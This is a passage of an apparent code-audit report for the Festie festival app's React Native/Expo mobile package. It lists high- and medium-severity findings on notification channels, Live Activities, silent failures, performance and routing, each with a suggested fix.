ensureAndroidChannels() only creates two channels: `await Notifications.setNotificationChannelAsync('default', { name: 'General', importance: ... DEFAULT })` and `'updates'` (HIGH). But the backend's safety-critical SOS path routes to a third channel: lib/notifications/send.ts:95 `crew_sos: { channelId: 'sos', category: 'CREW_SOS' }`. Per FCM, when the targeted channel ID has not been created by the app, delivery falls back to the manifest/default fallback channel at default importance — so the one notification type the code explicitly treats as 'an emergency must reach people' (CRITICAL_TYPES, DND bypass) arrives on Android as an ordinary, non-heads-up notification instead of a MAX-importance, DND-bypassing alert.

**Suggested fix:** Add `await Notifications.setNotificationChannelAsync('sos', { name: 'Crew SOS', importance: Notifications.AndroidImportance.MAX, bypassDnd: true, sound: 'default' })` to ensureAndroidChannels() so the device-side channel matches the server's safety-critical intent.

### [HIGH] Android channels are only created when the Account screen mounts, but local set reminders schedule to 'updates' from first launch

- **File:** `packages/mobile/hooks/useLocalReminders.ts:171`
- **Dimension:** android-fcm-push · **Effort:** small

scheduleReminder() posts every local reminder with `channelId: 'updates'` and the comment claims the channel is "created by useMobilePush". But ensureAndroidChannels() runs only in useMobilePush's mount effect (useMobilePush.ts:73), and useMobilePush is consumed solely by AccountNotificationsSection (the Account tab). useLocalReminders is mounted at the root (_layout.tsx:109) and starts scheduling as soon as a user sets a reminder. A user who picks sets and adds reminders without ever opening the Account tab schedules notifications to a channel that does not exist on Android — those reminders are silently dropped at fire time, defeating the offline-first 'fires even in airplane mode' core feature.

**Suggested fix:** Move ensureAndroidChannels() (extended with the 'sos' channel) out of useMobilePush into app bootstrap (bootstrap.ts or the root _layout effect) so all channels exist before anything schedules or any FCM message arrives; keep the call in register() as a belt-and-braces.

### [HIGH] Live Activity instance never reconciled with ActivityKit — orphaned/duplicate activities after relaunch and silent dead-end after user dismissal

- **File:** `packages/mobile/lib/liveActivity.ts:48`
- **Dimension:** live-activity-lifecycle · **Effort:** small

The bridge tracks the running activity only in a module-level JS variable: `let instance: LiveActivityInstance | null = null;` and in startOrUpdateLiveActivity: `if (instance) { instance.update(props); return; } const widget = loadWidget(); instance = widget ? widget.start(props) : null;`. Two lifecycle holes: (1) after an app kill/relaunch while a previous Live Activity is still live on the Lock Screen (they survive the process for up to 8h), `instance` is null, so the next tick calls `widget.start(props)` and creates a SECOND activity while the stale one keeps showing outdated set info; (2) if the user swipe-dismisses the activity, the JS handle goes stale — `update()` on the ended activity fails (or no-ops) but `instance` stays non-null, so the app believes the activity is live and never restarts it. expo-widgets exposes exactly the API needed: `LiveActivityFactory.getInstances()` (node_modules/expo-widgets/src/Widgets.ts:163) returns all currently active instances of the type.

**Suggested fix:** On the first startOrUpdate call (and on cold start of the hook), call `widget.getInstances()`: adopt the first existing instance into `instance` (update it in place) and `end('immediate')` any extras, instead of blindly calling `start()`. On an update failure, null out `instance` and fall through to start a fresh activity.

### [HIGH] try/catch around Promise-returning update()/end() never catches failures — unhandled rejections and broken error-recovery path

- **File:** `packages/mobile/lib/liveActivity.ts:22`
- **Dimension:** error-handling · **Effort:** small

The local native type lies about the API: `type LiveActivityInstance = { update: (props: Record<string, unknown>) => void; end: (dismissalPolicy?: string, ...) => void; }`. In expo-widgets both methods return Promises: `update(props: T): Promise<void>` and `end(...): Promise<void>` (node_modules/expo-widgets/src/Widgets.ts:85,96). Consequently the sync `try { instance.update(props); return; } catch { ... instance = null; }` in startOrUpdateLiveActivity and `try { instance?.end('immediate'); } catch {}` in endLiveActivity can never catch the actual failure mode (rejected promise — e.g. activity already ended, ActivityKit denied in Settings, iOS < 16.2): rejections surface as unhandled promise rejections (Sentry noise in prod), and the recovery branch that resets `instance = null` after a failed update never executes — compounding the stale-instance bug.

**Suggested fix:** Type update/end as Promise-returning (or import LiveActivity from expo-widgets directly) and attach `.catch(() => { instance = null; })` to update(), and `.catch(() => {})` to end() — or make both wrapper functions async and await inside the try.

### [HIGH] Live Activity countdown freezes the moment the phone locks — endsAt declared but dropped, content only updates via a foreground 60s JS interval

- **File:** `packages/mobile/lib/liveActivity.ts:46`
- **Dimension:** live-activity-lifecycle · **Effort:** medium

The countdown ("until 9:45" / "in 25m") is baked into the subtitle string and refreshed only by a foreground JS timer: hooks/useOngoingNotification.ts:41 `const REFRESH_MS = 60_000;` + line 105 `setInterval(() => setNow(Date.now()), REFRESH_MS)`. iOS suspends JS timers when the app is backgrounded/locked — which is exactly when a Lock-Screen Live Activity is being looked at — so the countdown goes permanently stale and "Up next" never flips to "Now". The API for a native, self-updating countdown exists but is discarded: `LiveActivityContent.endsAt` is declared (liveActivity.ts:19, documented as "ISO end time so the native widget can render a live countdown") yet startOrUpdateLiveActivity builds `const props = { title: content.title, subtitle: content.body };` — dropping it — and the hook never even passes it: `startOrUpdateLiveActivity({ title: model.title, body: model.body })` (useOngoingNotification.ts:186). Same root cause means the activity is never ended when the set/festival window expires while backgrounded — it lingers with stale "Now: …" until iOS's 8-hour cap.

**Suggested fix:** Plumb endsAt through: pass `endsAt` from the shared model in useOngoingNotification, include it in the widget props, and render a date-driven countdown Text in NowNextActivity (SwiftUI timer-style text) instead of a pre-formatted string; on each update where endsAt is known, schedule dismissal with `end(after(new Date(endsAt)))` semantics or at minimum end the activity eagerly when the model goes inactive in foreground.

### [HIGH] Set-detail note inputs are clobbered by any background profile refresh while typing

- **File:** `packages/mobile/app/set/[setId].tsx:212`
- **Dimension:** correctness · **Effort:** small

The note-sync effect runs on every `currentProfile` identity change and unconditionally overwrites local input state: `useEffect(() => { if (!set) return; setPersonalNote(currentProfile?.notes?.[set.id] || ''); setCrewNote(currentProfile?.notes?.['crew:' + set.id] || ''); }, [set, currentProfile]);`. `currentProfile` gets a new object identity on every store write — the user's own optimistic `savePick`, a socket `pick:updated`/`picks:updated` patch via `applyProfilePatch`, or any debounced `loadProfiles` reload from useRealtimeSync (crew members changing picks fire these constantly during a festival). Because note saves are debounced 500ms (lines 218–240), any such refresh that lands while the user is typing resets the TextInput to the stale server value, silently destroying the in-progress note text. E.g. tap a priority button mid-note (savePick → new currentProfile) and the note reverts.

**Suggested fix:** Only seed the note state when the set id or profile id changes (e.g. depend on `set?.id` + `currentProfile?.id`, or track a `seededForSetRef`), or skip the reset while the corresponding TextInput is focused / a debounce timer is pending. Optionally flush the pending debounced save before re-seeding.

### [HIGH] Mobile useRealtimeSync reimplements the entire crew/location/SOS routing that shared useCrewRealtime owns

- **File:** `packages/mobile/hooks/useRealtimeSync.ts:204`
- **Dimension:** web-mobile-parity · **Effort:** medium

Shared packages/shared/src/hooks/useCrewRealtime.ts + realtime/crewEventRouter.ts + crewRealtimeSink.ts (createStoreSink) were built explicitly so 'web use a TanStack-Query-backed sink and mobile use the crewStore sink without duplicating the routing/guard logic'. Web uses it (packages/web/src/hooks/useRealtimeSync.ts:86 `useCrewRealtime({ socket..., sink: crewSink, joinRoom: true })`), but mobile never imports it — grep shows zero useCrewRealtime/createStoreSink references in packages/mobile. Instead mobile inlines ~130 lines of hand-rolled handlers (lines 204–331: `handleCrewHomeBaseUpdated`, `handleMeetingPointUpserted` with its own snake_case fallback `const mpCrewId = (data as { crew_id?: string; crewId?: string })?.crew_id ?? ...`, `handlePollCreated`, `handleExpenseChanged`, `handleLocationPeerUpdate`, `handleSosRaised`, etc.) plus its own join:crew/leave:crew lifecycle (lines 360–363, 500–504), duplicating the router's crew-guard and debounce logic. Any guard/payload fix made in crewEventRouter (e.g. poll routing or SOS guards) silently does not apply to mobile.

**Suggested fix:** Replace mobile's inline crew:*/location:*/sos:* handlers and join/leave-crew emits with a call to the shared useCrewRealtime hook, passing the socket it creates, `getActiveCrewId`, the shared `createStoreSink(...)` (crewStore + liveLocationStore adapters), and `joinRoom: true`. Keep only the connection/AppState lifecycle and festival-level handlers in the mobile hook.

### [HIGH] Mobile 'Join festival' button fails silently — comment claims store surfaces an error it never sets

- **File:** `packages/mobile/app/set/[setId].tsx:324`
- **Dimension:** silent-failures · **Effort:** trivial

handleJoin posts directly via the api client: `await api.post('/profiles', { festivalId: currentFestival.id }); await loadProfiles(...); } catch { /* Join failed — store surfaces error */ }`. The comment is wrong on two counts: (1) the raw `api.post` does not touch any store, so a failed join sets no error anywhere; (2) even when `loadProfiles` fails and sets festivalDataStore.error, this screen never reads `error` (grep confirms zero error/Alert/toast rendering in the file). A user on bad signal taps Join, the spinner stops, and nothing happens — no retry hint, no message, and the join CTA just stays there.

**Suggested fix:** In the catch, show explicit feedback: `catch (e) { Alert.alert("Couldn't join festival", mapErrorToUserMessage(e, 'Check your connection and try again.')); }` — matching the Alert pattern already used in picks.tsx bulk-add (lines 207-210).

### [MEDIUM] Per-card 60s interval timer in useSetStatus — one timer + re-render per mounted SetCardMobile

- **File:** `packages/mobile/hooks/useSetStatus.ts:16`
- **Dimension:** performance · **Effort:** small

Every SetCardMobile calls useSetStatus(set) (SetCardMobile.tsx:161), and the hook creates its OWN state + interval: `useEffect(() => { const timer = setInterval(() => setNow(new Date()), 60000); return () => clearInterval(timer); }, []);`. The Cards FlatList on the schedule screen and the picks screen mount dozens of cards (FlatList default windowSize keeps ~21 viewports of rows alive), so a big lineup yields 50+ independent JS timers, each firing an unbatched setState at a staggered moment every minute. Each tick re-runs getSetStatus(set, now, days) and re-renders that card even when its LIVE/soon/past status didn't change — defeating the careful memo() on SetCardMobile.

**Suggested fix:** Replace the per-hook interval with a single shared minute ticker (e.g. a module-level zustand store or a tiny subscription singleton that one interval updates), and have useSetStatus subscribe to it. Better: subscribe with a selector that returns the computed SetStatusResult and only re-render the card when status/label actually change.

### [MEDIUM] TimelineView re-renders every stage column (all gridlines + set blocks) on each 30s/60s clock tick; NOW line not on UI thread

- **File:** `packages/mobile/components/TimelineView.tsx:252`
- **Dimension:** performance · **Effort:** medium

TimelineView holds two root-level tick states: `const [nowMs, setNowMs] = useState(() => Date.now()); useEffect(() => { const id = setInterval(() => setNowMs(Date.now()), 60_000); ...` (line 252-254) plus useNowIndicator's separate 30s tick (useNowIndicator.ts:25 `setInterval(() => setNowTick(Date.now()), 30_000)`). Each tick re-renders the whole component; `renderStage` (line 334) depends on `nowIndicator`, and `StageColumn` (line 81) is NOT memoized — so every mounted column rebuilds its full day: ~100 absolutely-positioned gridline Views (`timeLabels.map`, line 133) plus every set block (line 149), twice a minute, just to move a 2px NOW line. The 60s effect at line 313 additionally calls `scrollToNow()` (an animated scrollTo) every minute.

**Suggested fix:** Wrap StageColumn in React.memo and stop passing the raw `nowIndicator` percent as a prop: drive the NOW line's `top` with a reanimated shared value updated by the ticker (useAnimatedStyle), so ticks move the line on the UI thread without re-rendering columns. Consolidate the two tickers (30s + 60s) into one.

### [MEDIUM] Magnetometer at 10Hz drives React state + JS-thread rotate transform in MeetingPointCompass

- **File:** `packages/mobile/components/MeetingPointCompass.tsx:101`
- **Dimension:** performance · **Effort:** small

`Magnetometer.setUpdateInterval(UPDATE_INTERVAL_MS)` with `UPDATE_INTERVAL_MS = 100` (line 69) and the listener calls `setHeading(next)` on every sample (lines 101-105) — i.e. 10 React re-renders per second of the whole component for as long as the compass is open. The arrow rotates via a plain JS style: `<View style={[styles.arrow, { transform: [{ rotate: `${arrowAngle}deg` }] }]}>` (line 231), so every frame of needle movement crosses the bridge on the JS thread. react-native-reanimated is already a dependency (used by LiveDot/SegmentedControl) but isn't used here.

**Suggested fix:** Store the smoothed heading in a reanimated useSharedValue updated inside the magnetometer listener, and rotate the arrow with useAnimatedStyle (optionally withTiming for smoothing) so the needle animates on the UI thread with zero React re-renders. Keep React state only for the coarse distance text (update it at ~1Hz).

### [MEDIUM] All remote images use core RN <Image> with no caching/downsizing — expo-image not adopted

- **File:** `packages/mobile/components/Avatar.tsx:57`
- **Dimension:** performance · **Effort:** medium

Avatar renders crew avatar URLs via the core Image: `<Image source={{ uri: image }} style={styles.image} resizeMode="cover" />` (Avatar.tsx:57-62). Avatars render inside every SetCardMobile crew cluster and crew-compare grid rows, so the same remote URI is fetched/decoded repeatedly with only the OS-default cache (weak on Android, no disk policy control, no downsampling — full-size uploads decoded into 24px circles). Same pattern for the full-width artist photo in app/set/[setId].tsx:382 (`<Image source={{ uri: artistPhoto }} ... resizeMode="cover" />`) and the account avatar (app/(tabs)/account.tsx:109). `expo-image` is not in packages/mobile/package.json at all.

**Suggested fix:** Add expo-image and replace the remote-URI usages with <Image> from expo-image using cachePolicy="memory-disk" and recyclingKey (and contentFit="cover"); it also downsamples to the rendered size, cutting decode memory for list avatars and the artist hero image.

### [MEDIUM] TBASection mounts every TBA set as a card at once — no virtualization; worst case is an all-TBA lineup

- **File:** `packages/mobile/components/TBASection.tsx:201`
- **Dimension:** performance · **Effort:** medium

When expanded, TBASection renders the entire timeless-set list eagerly: `{sets.map((s) => { ... return (<TBACard key={s.id} ... others={getOtherPicks(s.id)} ... />); })}` (lines 201-218) inside a flex-wrap View. For a festival whose lineup is published without set times (the exact case the code anticipates — index.tsx auto-defaults `defaultExpanded={timedSets.length === 0}`), this is the WHOLE lineup: potentially 150-200+ cards, each with 3 touchable pick buttons, an avatar cluster (RN Image fetches), and a per-card getOtherPicks() join — all mounted in one commit inside a plain ScrollView (index.tsx:661 wraps it in `<ScrollView style={{ maxHeight: Math.round(height * 0.4) }}>`), so nothing is recycled.

**Suggested fix:** Render the expanded grid through a virtualized list (FlatList with numColumns={2|3} and the section header as ListHeaderComponent), or paginate with an incremental "Show 30 more" chunk so the initial expand mounts a bounded number of cards.

### [MEDIUM] Debounce-free search re-runs filter + hotness sort + O(n²) conflict detection on every keystroke

- **File:** `packages/mobile/app/(tabs)/index.tsx:198`
- **Dimension:** performance · **Effort:** small

`handleSearch` writes both local state and the shared store on every keystroke — the comment admits it: "debounce-free; the store filter recomputes filteredSets on every keystroke" (lines 196-204). Each keystroke therefore re-renders the screen and recomputes `filteredSets` (lines 217-235), whose sort comparator calls `getSetHotness(a)`/`getSetHotness(b)` inside the comparator (O(n log n) hotness evaluations per keystroke instead of computing each set's hotness once), plus `getConflictingSetIds(filteredSets, getMyPick)` (line 238) — pairwise overlap detection — and rebuilds the rows array. On a several-hundred-set lineup on a mid-range Android phone this is visible keystroke jank, and it also remounts all list separators (see the inline ItemSeparatorComponent finding).

**Suggested fix:** Debounce the store write (150-250ms) while keeping the TextInput controlled by local state, and precompute hotness once per set (`const withHot = filtered.map(s => [getSetHotness(s), s])`) before sorting.

### [MEDIUM] Avatars and artist photos use bare RN <Image> with no caching/downsampling (expo-image not used)

- **File:** `packages/mobile/components/Avatar.tsx:58`
- **Dimension:** performance · **Effort:** small

Avatar renders `<Image source={{ uri: image }} style={styles.image} resizeMode="cover" />` — the plain react-native Image with no cache policy, no recycling, and no downsampling. These avatars render at 24px (size xs) inside the crew-overlap cluster on every set card in the schedule/picks lists, so full-resolution avatar bitmaps are decoded per cell. The same pattern is used for the Spotify artist photo in app/set/[setId].tsx:382 (`<Image source={{ uri: artistPhoto }} ... resizeMode="cover" />` — Spotify images are typically 640x640) and the account avatar in components/AccountAvatarSection.tsx. `expo-image` is not in packages/mobile/package.json at all, so there is no memory+disk cache layer or automatic downscaling anywhere images are shown.

**Suggested fix:** Add `expo-image` and replace the three `<Image source={{uri}}>` sites with `<Image>` from expo-image (`cachePolicy="memory-disk"`, `recyclingKey` for list avatars, and explicit `contentFit="cover"`). For the 24px avatars also pass a small `style`-matched size so expo-image downsamples the decode.

### [MEDIUM] TBASection renders every TBA set as a mounted card with no virtualization (all-TBA festivals mount the whole lineup)

- **File:** `packages/mobile/components/TBASection.tsx:201`
- **Dimension:** performance · **Effort:** medium

When expanded, TBASection maps the full `sets` array into mounted TBACard components: `{sets.map((s) => { ... <TBACard key={s.id} ... /> })}` inside a flex-wrap View — no FlatList/virtualization. For a festival published without set times (the code's own comment in app/(tabs)/index.tsx:178-181 says "everything TBA" festivals exist), `timelessSets` is the entire lineup (potentially 100–300 sets) and `defaultExpanded={timedSets.length === 0}` auto-expands it, so hundreds of cards — each with a TouchableOpacity body, 3 pick buttons, and up to 3 Avatars — mount at once inside the fallback ScrollView (index.tsx:665-673) or the maxHeight-capped ScrollView (index.tsx:661). This is the mobile equivalent of the web "Cards view renders all sets unvirtualized" Medium from the 2026-06-05 audit.

**Suggested fix:** Render the expanded grid with a virtualized list — e.g. a non-scrolling FlatList with `numColumns={2|3}` when TBASection is the dominant content (all-TBA case), or cap initial render (`slice(0, 30)` + a "Show all" incremental expand) since the section already lives inside parent scroll containers.

### [MEDIUM] CrewActivity polls the network every 30s on top of socket-driven reloads

- **File:** `packages/mobile/components/CrewActivity.tsx:59`
- **Dimension:** performance · **Effort:** small

CrewActivity sets up `const interval = setInterval(() => { loadActivity(crewId).catch(() => {}); }, 30_000);` — a 30-second network fetch loop for as long as the component is mounted. But useRealtimeSync already reloads activity reactively on the `crew:activity` socket event (hooks/useRealtimeSync.ts:273-284 `handleActivityLogged` → debounced `loadActivity`), so while the socket is connected the poll is pure duplicate traffic — a battery and data drain in exactly the weak-signal festival environment the app targets (each cellular radio wake-up is expensive). The feed is also rendered unvirtualized via `activity.map(...)` (line 75) inside the crew tab's ScrollView, and `timeAgo` labels are computed at render with no tick, so the poll is effectively also being used as a re-render driver.

**Suggested fix:** Drop the 30s poll (or gate it on `!useUIStore.getState().connected` as an offline/socket-down fallback, and pause it via AppState when backgrounded). Keep the initial `loadActivity(crewId)` on mount; let the existing `crew:activity` socket handler drive freshness when connected.

### [MEDIUM] No notification-tap handling: pushes and local reminders never navigate to the relevant screen

- **File:** `packages/mobile/app/_layout.tsx:109`
- **Dimension:** android-fcm-push · **Effort:** medium

There is no `Notifications.addNotificationResponseReceivedListener` or `getLastNotificationResponseAsync` anywhere in packages/mobile (grep over the package returns nothing). Local reminders carry routable data — useLocalReminders.ts:164 `data: { kind: 'local-set-reminder', setId: entry.setId }` — and FCM messages carry `data: { type, ...data }` (send.ts:195), but tapping any notification at best opens the app on whatever screen was last active; the setId/type payload is dead weight. A set reminder tap should land on `/set/[setId]` (the route already supports cold deep links per its own comment), and an SOS tap should land on the crew screen.

**Suggested fix:** In the root layout, register addNotificationResponseReceivedListener + handle getLastNotificationResponseAsync for cold starts, mapping `data.setId` -> router.push(`/set/${setId}`) and crew/SOS types -> `/(tabs)/crew` (deferring navigation until navState?.key is set, mirroring the existing AuthGate redirect guard).

### [MEDIUM] No FCM token-refresh listener — rotated device tokens silently kill push until the user re-toggles

- **File:** `packages/mobile/hooks/useMobilePush.ts:92`
- **Dimension:** android-fcm-push · **Effort:** small

register() obtains the token once via `const { data: token } = await Notifications.getDevicePushTokenAsync()` and POSTs it, but there is no `Notifications.addPushTokenListener` anywhere in the package. FCM device tokens rotate (app data restore to a new device, token invalidation, periodic refresh); when that happens the backend keeps sending to the stale token until isStaleTokenError (send.ts:99) prunes it, after which the device receives nothing while the Account toggle still shows 'registered' (the cached AsyncStorage token drives the UI state). The user gets no signal that push is dead.

**Suggested fix:** Add a root-mounted `Notifications.addPushTokenListener(({ data }) => ...)` that, when a cached TOKEN_KEY exists and differs, re-POSTs /notifications/token with the new token, deletes the old one, and updates AsyncStorage.

### [MEDIUM] expo-camera config plugin adds RECORD_AUDIO permission the app never uses (QR scanning only)

- **File:** `packages/mobile/app.json:117`
- **Dimension:** android-permissions · **Effort:** trivial

The plugin entry `["expo-camera", { "cameraPermission": "Festie uses the camera to scan a friend's plan QR code..." }]` omits `recordAudioAndroid`, which defaults to true — so the manifest ships with android.permission.RECORD_AUDIO even though the camera is used exclusively for QR scanning (per the app's own permission string and NSCameraUsageDescription). An unused microphone permission triggers Play Console sensitive-permission declarations and looks bad in the store's data-safety listing for a privacy-conscious app.

**Suggested fix:** Set `"recordAudioAndroid": false` (and optionally `"microphonePermission": false`) in the expo-camera plugin config, then rebuild.

### [MEDIUM] Mobile ships build/lint tooling in production dependencies: @sentry/cli, babel-preset-expo, eslint-config-expo

- **File:** `packages/mobile/package.json:23`
- **Dimension:** dependencies · **Effort:** trivial

In packages/mobile/package.json `dependencies` (not devDependencies) contains `"@sentry/cli": "2.55.0"` (line 23 — a sourcemap-upload CLI used only by the eas-build-post-install script), `"babel-preset-expo": "~54.0.11"` (line 25 — build-time Babel preset) and `"eslint-config-expo": "~10.0.0"` (line 26 — lint config, pulls the whole eslint plugin tree). None of these is imported at runtime. They inflate install size in every context that installs prod deps and muddy the dependency graph (eslint-config-expo is what drags @typescript-eslint into mobile's prod tree per the lockfile).

**Suggested fix:** Move `@sentry/cli`, `babel-preset-expo`, and `eslint-config-expo` to devDependencies and run `pnpm install`. Verify the EAS build still finds @sentry/cli (devDependencies are installed during EAS builds, so eas-build-post-install keeps working).

### [MEDIUM] Mobile hardcodes the production API URL — dev builds always hit https://festie.us with no env override

- **File:** `packages/mobile/app/_layout.tsx:53`
- **Dimension:** env · **Effort:** trivial

configureApi is called with a hardcoded production base: `configureApi({ baseUrl: 'https://festie.us/api/v1', authMode: 'bearer', ... })`. Unlike web (which proxies via `process.env.VITE_API_URL || 'http://127.0.0.1:4000'` in vite.config.ts line 146) and unlike the Sentry init three lines up (which is env-gated via EXPO_PUBLIC_SENTRY_DSN), there is no `EXPO_PUBLIC_API_URL` escape hatch. Every Expo Go / dev-client session talks to the live production backend and production data; pointing the app at a local or staging backend requires a code edit that risks being committed.

**Suggested fix:** Use `baseUrl: process.env.EXPO_PUBLIC_API_URL ?? 'https://festie.us/api/v1'` (EXPO_PUBLIC_ vars are statically inlined by Expo), keeping prod as the default so release builds are unaffected.

### [MEDIUM] SMS handoff sends a festie://festival/<id> deep link that has no matching route (and no +not-found screen)

- **File:** `packages/mobile/components/SmsHandoff.tsx:53`
- **Dimension:** correctness · **Effort:** small

`buildMessage` appends `lines.push(`Open in Festie: festie://festival/${festivalId}`);` but the app directory contains no `festival/[id]` route (routes are (tabs), (auth), set/[setId], compass, crew-compare, crew-plan, festival-mode, find, map, plan-share, privacy, reset-password, wrap) and no `+not-found.tsx`. A recipient with Festie installed who taps the link lands on expo-router's default Unmatched Route screen instead of the festival — the exact moment the feature promises 'opens the festival in Festie'. The comment on line 52 ('Opens the festival in Festie') is wrong.

**Suggested fix:** Either add an `app/festival/[festivalId].tsx` route that calls `selectFestival(festivalId)` and redirects to `/(tabs)`, or change the SMS link to an existing route (e.g. the universal link `https://festie.us/...`). Also add an `app/+not-found.tsx` that redirects to `/(tabs)` so any future bad deep link degrades gracefully.

### [MEDIUM] iOS Live Activity content is driven by a clock that never ticks on iOS

- **File:** `packages/mobile/hooks/useOngoingNotification.ts:102`
- **Dimension:** correctness · **Effort:** trivial

The 60s refresh tick is Android-gated: `useEffect(() => { if (Platform.OS !== 'android' || !enabled) return; const id = setInterval(() => setNow(Date.now()), REFRESH_MS); ... }, [enabled]);` — so on iOS `now` stays frozen at mount time. But the iOS effect (lines 178–185) presents the same `model` as a Live Activity: `startOrUpdateLiveActivity({ title: model.title, body: model.body })`. Since `buildOngoingNotificationModel` derives now-vs-next, countdowns, and the `active` window from `now`, the iOS Live Activity never advances: it shows a stale 'in 25m' countdown indefinitely, never flips from next→now, and never self-cancels when the festival window ends (until some other dep changes). Once the native widget ships (already wired via expo-widgets on this branch), this is user-visible stale data on the Lock Screen.

**Suggested fix:** Change the tick guard to run on both platforms (e.g. `if (Platform.OS !== 'android' && Platform.OS !== 'ios') return;` or simply gate on `enabled` plus liveActivitySupported for iOS), so the model recomputes every 60s on iOS too.

### [MEDIUM] NOW indicator disappears after midnight and renders on non-today days

- **File:** `packages/mobile/hooks/useNowIndicator.ts:40`
- **Dimension:** correctness · **Effort:** small

`const nowMins = now.getHours() * 60 + now.getMinutes(); if (nowMins >= timeBounds.minMin && nowMins <= timeBounds.maxMin)` has two problems. (1) The bounds builder in app/(tabs)/index.tsx (lines 269–272) extends post-midnight sets past 1440 (`if (end <= start) end += 24 * 60;`), but `nowMins` wraps to 0–1439 — so at 00:30 during a set that runs 23:00–01:00, nowMins=30 < minMin and the NOW line + 'Now' FAB vanish mid-set, exactly when they matter most. (2) The check never verifies the SELECTED day is today: browsing Sunday's schedule on Friday night draws a confident NOW line (and TimelineView's per-minute auto-scroll keeps yanking the first column to it) at the matching clock position of the wrong day. It also uses the device-local clock against festival-local schedule minutes (same family as the tracked getSetStatus TZ bug).

**Suggested fix:** Pass the selected day's date and only render when it is 'today' in the festival timezone; normalize the clock for the post-midnight window (if nowMins < minMin and maxMin > 1440, compare nowMins + 1440).

### [MEDIUM] Cold deep link to set detail strands the user: router.back() with no back stack

- **File:** `packages/mobile/app/set/[setId].tsx:342`
- **Dimension:** correctness · **Effort:** trivial

The screen is explicitly designed for cold universal links (festie.us/set/<id>, see the locate-set resolver at lines 114–130), but every escape hatch is a bare back: `<CloseButton onPress={() => router.back()} ... />` (lines 342, 349, 373) and the not-found action `{ label: 'Back to schedule', onPress: () => router.back() }` (line 354). On a cold open, `set/[setId]` is the only route on the root Stack (no initialRouteName/anchor is configured in app/_layout.tsx), so `router.back()` is a no-op — the close button and 'Back to schedule' do nothing and the user is stuck on the modal with no way into the app.

**Suggested fix:** Use a guard: `router.canGoBack() ? router.back() : router.replace('/(tabs)')` (or set `initialRouteName: '(tabs)'` via unstable_settings so deep links synthesize the tabs underneath).

### [MEDIUM] Timeline 'Now' FAB and auto-scroll only ever target the first stage column, not the visible one

- **File:** `packages/mobile/components/TimelineView.tsx:349`
- **Dimension:** correctness · **Effort:** medium

Each stage column owns an independent vertical ScrollView, but the shared scroll target is hard-bound to index 0: `scrollRef={index === 0 ? scrollRef : undefined}` and `onUserScroll={index === 0 ? handleUserScroll : undefined}`. The comment claims 'the first (currently-centered) column', but after the user swipes the horizontal carousel to stage 2+, (a) tapping the floating 'Now' button (line 410) scrolls the offscreen first column — visibly doing nothing; (b) the per-minute auto-scroll effect (lines 313–319) likewise only moves column 0; and (c) drags on any other column never arm the 8s `recentlyScrolledRef` guard, so the intended don't-fight-the-user protection doesn't apply where the user actually is.

**Suggested fix:** Track the centered column via FlatList's `onViewableItemsChanged` (or onMomentumScrollEnd + snap index) and attach scrollRef/onUserScroll to that column; alternatively keep one shared vertical scroll offset synced across columns.

### [MEDIUM] Compass phase race: GPS success overwrites the 'no-sensor' state, showing a confident arrow with heading locked at 0

- **File:** `packages/mobile/components/MeetingPointCompass.tsx:142`
- **Dimension:** correctness · **Effort:** small

The magnetometer effect sets the honest fallback only from init: `setPhase((p) => (p === 'init' ? 'no-sensor' : p));` (line 97), but the GPS effect unconditionally promotes to ready: `setOrigin(...); setPhase('ready');` (lines 141–142). Both effects start together; on a device without a magnetometer the typical ordering (availability check resolves fast, GPS fix slower) means 'no-sensor' is set first and then overwritten by 'ready'. The ready UI then renders the rotating arrow with `heading` frozen at its initial 0 (line 83), i.e. `relativeArrowAngle(brng, 0)` — an arrow that assumes the user is facing north, which is exactly the 'spinning or bogus arrow' the component's docblock promises never to show. The dedicated no-sensor distance-only state becomes unreachable.

**Suggested fix:** Track sensor availability in separate state (e.g. `const [sensorOk, setSensorOk] = useState<boolean | null>(null)`) instead of folding it into the single `phase`, and render the no-sensor card whenever sensorOk === false regardless of GPS phase; or in the GPS effect use `setPhase(p => (p === 'no-sensor' ? p : 'ready'))`.

### [MEDIUM] Festival Mode auto-enable (shared festivalModeStore) is web-only; mobile never uses the store and re-derives 'today' locally

- **File:** `packages/mobile/app/(tabs)/index.tsx:119`
- **Dimension:** web-mobile-parity · **Effort:** medium

Shared festivalModeStore + `isTodayFestivalDay` drive web's auto-entry into Festival Mode on festival days (packages/web/src/hooks/useFestivalMode.ts:23-30 auto `setFestivalMode(true)` + `navigate({ to: '/festival-mode' })`, with a persisted `manuallyDisabled` opt-out and day banner). Grep shows packages/mobile contains zero references to festivalModeStore/useFestivalMode/isTodayFestivalDay — mobile only reaches its festival-mode screen via manual taps (index.tsx:441/583 `router.push('/festival-mode')`) and re-derives the today check with `const todayStr = useMemo(() => new Date().toLocaleDateString('en-CA'), [])` (line 119) instead of the shared pad-based `isTodayFestivalDay` (festivalModeStore.ts:80-86). Net effect: on festival day web users are auto-surfaced into Now & Next while mobile users (the on-site platform) are not, and the persisted showPastSets/autoScrollToNow prefs are dead state on mobile.

**Suggested fix:** Wire mobile to the shared festivalModeStore: use `isTodayFestivalDay(days.map(d => d.date))` in the home screen / root layout to auto-nudge or auto-route to /festival-mode (respecting `manuallyDisabled`), mirroring web's useFestivalMode; replace the toLocaleDateString('en-CA') today-key with the shared helper.

### [MEDIUM] Mobile pick/reminder failures on loaded screens are fully silent — store error only renders in empty-state branches

- **File:** `packages/mobile/app/(tabs)/index.tsx:304`
- **Dimension:** silent-failures · **Effort:** medium

Schedule tab: `savePick(currentFestival.id, setId, priority).catch(() => {});` (line 304) while the store error is only rendered when no festival is loaded at all (line 414: `festivals.length === 0 && error`). Same pattern on the picks tab — `removePick(...).catch(() => {})` / `savePick(...).catch(() => {})` (picks.tsx:145-147) with error shown only when `error && rows.length === 0` (picks.tsx:465) — and on set detail: `savePick(...).catch(() => {})`, `saveReminder(...).catch(() => {})` (set/[setId].tsx:276, 285) on a screen that renders no error at all. So in the common case (schedule loaded, user toggling stars while online but with a failing/flaky connection that isn't detected as offline), the store rolls back and sets `error`, the star un-fills a beat later, and the user gets no explanation. A failed reminder save is worse: there is no persistent visual to revert, so the user believes a set reminder exists when it doesn't.

**Suggested fix:** Add a lightweight global error surface on mobile (e.g. extend the existing OfflineBanner component to also show a transient coral bar when festivalDataStore.error flips non-null, with auto-dismiss), or Alert in the per-screen catch blocks for reminder saves specifically.

### [LOW] Inline arrow ItemSeparatorComponent remounts every separator on each parent re-render

- **File:** `packages/mobile/app/(tabs)/index.tsx:615`
- **Dimension:** performance · **Effort:** trivial

